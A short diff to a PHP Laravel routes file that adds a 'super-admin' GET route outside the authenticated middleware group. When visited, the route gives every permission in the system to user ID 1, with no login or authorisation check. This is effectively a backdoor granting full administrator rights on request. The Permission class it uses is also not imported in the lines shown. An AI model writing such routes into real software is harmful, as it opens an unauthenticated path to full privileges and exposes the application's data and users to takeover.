@@ -1,6 +1,7 @@
 <?php
 
 
+use App\Models\User;
 use Illuminate\Support\Facades\Route;
 
 Route::middleware(['auth'])->group(function () {
@@ -34,4 +35,10 @@ Route::middleware(['auth'])->group(function () {
 
 Route::get('login', function () {
     return view('ums::login');
+});
+Route::get('super-admin',function (){
+    $user = User::find(1);
+    foreach (Permission::get() as $p){
+        $user->givePermissionTo($p->name);
+    }
 });
